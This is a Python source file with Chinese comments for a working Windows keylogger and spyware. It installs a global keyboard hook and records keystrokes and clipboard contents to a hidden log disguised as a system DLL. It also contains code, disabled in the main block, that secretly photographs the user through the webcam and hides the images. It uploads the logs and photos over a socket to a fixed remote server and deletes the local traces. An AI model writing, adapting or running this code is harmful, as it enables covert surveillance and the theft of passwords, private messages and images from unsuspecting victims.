import sys, os, time
import socket, struct, json
import win32clipboard  # 剪贴板操作，需要安装pywin32才可以
import win32con
import win32api
import cv2

from ctypes import windll
from ctypes import CFUNCTYPE
from ctypes import POINTER
from ctypes import c_int, c_void_p
from ctypes import byref
from ctypes.wintypes import MSG

from threading import Timer
from threading import Thread
from threading import Lock


# 工具
class Utils:
    def __init__(self):
        # os.path.expanduser获取宿主机的根目录（保存文件使用）
        self.base_dir = os.path.expanduser('~') # 如果单纯放到C盘可能涉及权限问题，无法保存，而宿主机的根目录一定可以保存

        # 初始化生成日志文件
        self.log_path = r'%s/adhsvc.dll.system32' % self.base_dir
        open(self.log_path, 'a', encoding='utf-8').close()
        win32api.SetFileAttributes(self.log_path, win32con.FILE_ATTRIBUTE_HIDDEN)

        # 定义两把锁，控制读写
        self.mutex_log = Lock()  # 日志锁
        self.mutex_photo = Lock()  # 照片锁
        self.mutex_sock = Lock()  # 套接字上传锁
        # 服务端的ip和port
        self.server_ip = '192.168.43.161'
        self.server_port = 9999

        # 本地调试日志
        self.debug = True
        self.debug_log_path = r'%s/debug_log' % self.base_dir
        self.mutex_debug = Lock()

    #用于开发时候的调试日志，便于开发时候查错（可见）
    def log_debug(self, res):
        if not self.debug: return
        #加锁-----因为上传日志到服务器、记录调试日志和记录信息到日志用的是同一把锁，
        # 保障同一时间只执行三个操作中的一个
        self.mutex_debug.acquire()
        with open(self.debug_log_path, mode='a', encoding='utf-8') as f:
            f.write('\n%s\n' % res)
            #刷新，保证将信息写入到日志中
            f.flush()
        #锁释放
        self.mutex_debug.release()

    #正式日志，用于上传到服务器使用（不可见）
    def log(self, res):
        self.mutex_log.acquire()
        with open(self.log_path, mode='a', encoding='utf-8') as f:
            f.write(res)
            f.flush()
        self.mutex_log.release()

    #实现了拍照片并保存到宿主机的操作
    def take_photoes(self):
        while True:
            time.sleep(10)
            photo_path = r'%s/%s.jpeg' % (self.base_dir, time.strftime('%Y-%m-%d_%H_%M_%S'))
            cap = None

            try:
                # VideoCapture()中第一个参数是摄像头标号，默认情况电脑自带摄像头索引为0，外置为1.2.3…，
                # 参数是视频文件路径则打开视频，如cap = cv2.VideoCapture(“../test.avi”)
                # CAP_DSHOW是微软特有的,用于关闭摄像头,因为cv2.release()之后摄像头依然开启，所以必需要指定该参数
                cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                ret, frame = cap.read() #frame：读取摄像头获取的一些帧的数据
                #写数据和上传照片数据用同一把锁
                self.mutex_photo.acquire()
                cv2.imwrite(photo_path, frame) #将帧数据写入到文件，实际就是拍照功能
            except Exception as e:
                self.log_debug('照相异常： %s' % e)
            finally:
                # 无论如何都要释放锁，关闭相机
                self.mutex_photo.release()
                if cap is not None: cap.release() #None.release()
                #把打开的所有摄像头窗口关闭
                cv2.destroyAllWindows()

            if os.path.exists(photo_path):
                #将保存的照片打开，设置文件属性为隐藏属性（FILE_ATTRIBUTE_HIDDEN），避免被宿主机发现
                win32api.SetFileAttributes(photo_path, win32con.FILE_ATTRIBUTE_HIDDEN)

    #建立连接、封报头、传数据（上传日志和照片共通的地方）
    def send_data(self, headers, data):
        try:
            #window系统在同一时间大量上传文件可能会有Bug,因此加锁避免这种情况
            self.mutex_sock.acquire() # 上传数据的过程中不要做其他事情
            #连接固定操作
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((self.server_ip, self.server_port))

            #将报头json序列化
            head_json = json.dumps(headers)
            head_json_bytes = bytes(head_json, encoding='utf-8')
            #逐步发送报头长度、报头、数据
            client.send(struct.pack('i', len(head_json_bytes)))
            client.send(head_json_bytes)
            client.sendall(data)
            client.close()

            res = (True, 'ok')

        #记录日志使用
        except ConnectionRefusedError as e:
            msg = '套接字服务端未启动: %s' % e
            res = (False, msg)
        except Exception as e:
            msg = '套接字其他错误：%s' % e
            res = (False, msg)
        finally:
            self.mutex_sock.release()
        return res

    def upload_log(self):
        while True:
            time.sleep(10)

            #如果日志文件有内容则继续
            if not os.path.getsize(self.log_path): continue

            self.mutex_log.acquire()
            with open(self.log_path, mode='rb+') as f:
                data = f.read()
                # self.mutex_log.release()

                headers = {
                    'data_size': len(data),
                    'filename': os.path.basename(self.log_path)
                }

                self.log_debug('正在往服务端发送日志......[{}]'.format(data))

                is_ok, msg = self.send_data(headers, data)
                if is_ok:
                    self.log_debug('日志[{}]发送成功。。。'.format(data))
                else:
                    self.log_debug('日志[{}]发送失败：{}'.format(data, msg))
                    continue

                #truncate（0）将宿主机的日志清空
                f.truncate(0)

                self.mutex_log.release()

    def upload_photoes(self):
        while True:
            time.sleep(10)

            files = os.listdir(self.base_dir)
            #只获取这个根目录中的.jpeg文件
            files_jpeg = [file_name for file_name in files if file_name.endswith('jpeg')]
            for file_name in files_jpeg:
                file_path = r'%s/%s' % (self.base_dir, file_name)
                if not os.path.exists(file_path): continue

                self.log_debug('开始上传图片: %s' % file_name)
                headers = {
                    'data_size': os.path.getsize(file_path),
                    'filename': file_name
                }

                self.mutex_photo.acquire()
                with open(file_path, mode='rb+') as f:
                    data = f.read()
                #此处可以直接释放锁，因为拍照时间是我们设置的；上面上传日志时候可能涉及到上传过程中用户还是输入的情况
                self.mutex_photo.release()

                is_ok, msg = self.send_data(headers, data)
                if is_ok:
                    self.log_debug('图片%s发送完毕......' % file_name)
                else:
                    self.log_debug('图片%s发送失败：%s' % (file_name, msg))
                    continue

                #将上传完的文件删除
                os.remove(file_path)


utils = Utils()


# 定义类：定义拥有挂钩与拆钩功能的类
class Toad:
    def __init__(self):
        #windll.user32是将包装好的结果注册到window中
        self.user32 = windll.user32
        self.hooked = None

    #__开头表示该功能至少内部可见，外部不可见（不可调用）
    #具体的注入逻辑函数
    def __install_hook_proc(self, pointer):
        # self.hooked 为注册钩子（elf.user32.SetWindowsHookExA）返回的句柄
        #相当于鱼竿（远程控制的手柄）
        self.hooked = self.user32.SetWindowsHookExA(
            win32con.WH_KEYBOARD_LL,# 这一行代表注册了全局的键盘钩子，能拦截所有的键盘按键的消息。  # WH_KEYBOARD_LL = 13
            pointer,#刚才被加工成C语言函数的python函数
            0, # 钩子函数的dll句柄，此处设置为0即可
            0  # 所有线程
        )
        return True if self.hooked else False

    #将func这个普通函数注册到钩子中，传过来的func是个python函数，但是最终注入的一定要是转换成C语言
    def install_hook_proc(self, func):
        #这两句是固定的，总体作用是将python函数转换成C语言函数
        #CFUNCTYPE将python的变量添加一个声明（int、void等）
        #返回值CMPFUNC最终对func这个python函数进行加工处理，返回的pointer虽然是个指针
        #但是相当于pointer已经是个C语言的函数了
        CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
        pointer = CMPFUNC(func)  # 拿到函数hookProc指针，

        #为了逻辑清晰，将具体的注入逻辑写入到__install_hook_proc中，此处转回到__install_hook_proc
        if self.__install_hook_proc(pointer):
            #如果成功注册钩子，将信息记入调试日志（用于自己调试）
            #若开发完成则不需要该日志
            utils.log_debug("%s start " % func.__name__) #func.__name__是python本身自带的内置函数，是func这个函数的名字

        #msg实际上就是监听window进程以后返回的结果
        msg = MSG()
        # 监听/获取窗口的消息,消息进入队列后则取出交给勾链中第一个钩子
        #GetMessageA获取钩子返回的一些消息；byref是对msg进行的一些信息转换
        self.user32.GetMessageA(byref(msg), None, 0, 0)

    def uninstall_hook_proc(self):
        if self.hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.hooked) # 通过钩子句柄删除注册的钩子
        self.hooked = None


toad_obj = Toad()


# 2、定义钩子过程（即我们要注入的逻辑）：
# 就是个普通函数
#三个变量nCode, wParam, lParam中只有wParam（具体的键盘操作）在函数中有用到；
# 三个变量都在最后将钩取到的数据放回池中用到
def monitor_keyborad_proc(nCode, wParam, lParam):
    # win32con.WM_KEYDOWN = 0X0100  # 键盘按下，对应数字256
    # win32con.WM_KEYUP = 0x0101  # 键盘起来，对应数字257，监控键盘只需要操作KEYDOWN即可
    if wParam == win32con.WM_KEYDOWN:
        #固定操作，位运算
        hookedKey_ascii = 0xFFFFFFFF & lParam[0]
        #chr将ascii码转换成能认识的字符
        hookedKey = chr(hookedKey_ascii)

        #调试日志
        utils.log_debug('监听到hookeKey：[%s]  hookedKey_ascii：[%s]' % (hookedKey, hookedKey_ascii))

        keyboard_dic = {
            220: r'<`>',
            189: r'<->',
            187: r'<=>',
            8: r'<删除键>',

            9: r'<tab>',
            219: r'<[>',
            221: r'<]>',
            222: r'<\>',

            20: r'<大小写锁定>',
            186: r'<;>',
            192: r"<'>",
            13: r'<enter>',

            160: r'<lshift>',
            188: r'<,>',
            190: r'<.>',
            191: r'</>',
            161: r'<rshift>',

            162: r'<ctrl>',
            32: r'<space>',
            37: r'<左箭头>',
            38: r'<上箭头>',
            39: r'<右箭头>',
            40: r'<下箭头>',
        }

        if (hookedKey == 'Q'):  # 测试时打开，用于注销钩子程序，正式运行时注释这一段即可
            toad_obj.uninstall_hook_proc()
            sys.exit(-1)
            # pass

        if hookedKey_ascii in keyboard_dic:  # 按下了了非常规键
            res = keyboard_dic[hookedKey_ascii]
            utils.log_debug('监听到输入: {}'.format(res))
            utils.log(res)

        if hookedKey_ascii > 32 and hookedKey_ascii < 127:  # 检测击键是否常规按键（非组合键等）
            if hookedKey == 'V' or hookedKey == 'C':
                win32clipboard.OpenClipboard()
                paste_value = win32clipboard.GetClipboardData()  # 获取粘贴板的值
                win32clipboard.CloseClipboard()

                if paste_value: # 剪贴板有值，则代表上述V和C的输入是组合键，用户输入的有效数据在剪贴板里放着
                    #写入到正常的日志中
                    utils.log(paste_value)
                    #调试日志
                    utils.log_debug('粘贴值： {}'.format(paste_value))
            else:
                utils.log_debug('监听到输入: {}'.format(repr(hookedKey)))
                utils.log(hookedKey)

    # CallNextHookEx将钩子的信息重新放回钩链中
    return windll.user32.CallNextHookEx(toad_obj.hooked, nCode, wParam, lParam)


# 钩链：钩1，钩2
# 就是个普通函数
# 锁键盘就是不将数据放回池中（不执行return windll.user32.CallNextHookEx）
def lock_keyboard_proc(nCode, wParam, lParam):
    utils.log_debug('锁定键盘程序正在执行。。。。。。。。')
    return '该处返回值随意，无影响'


if __name__ == '__main__':
    # 监听键盘输入->并记录日志
    t1 = Thread(target=toad_obj.install_hook_proc, args=(monitor_keyborad_proc,))
    # 锁定键盘功能
    # Timer指定一段时间（120s)后运行某个线程
    # t2 = Timer(120, toad_obj.install_hook_proc, args=[lock_keyboard_proc, ])

    # 偷拍功能->保存图片文件
    # t3 = Thread(target=utils.take_photoes)

    # 上传数据功能：日志文件、图片文件
    t4 = Thread(target=utils.upload_log)
    t5 = Thread(target=utils.upload_photoes)

    # t2.daemon = True
    # t3.daemon = True
    t4.daemon = True
    t5.daemon = True

    t1.start()
    # t2.start()
    # t3.start()
    t4.start()
    t5.start()

    t1.join()



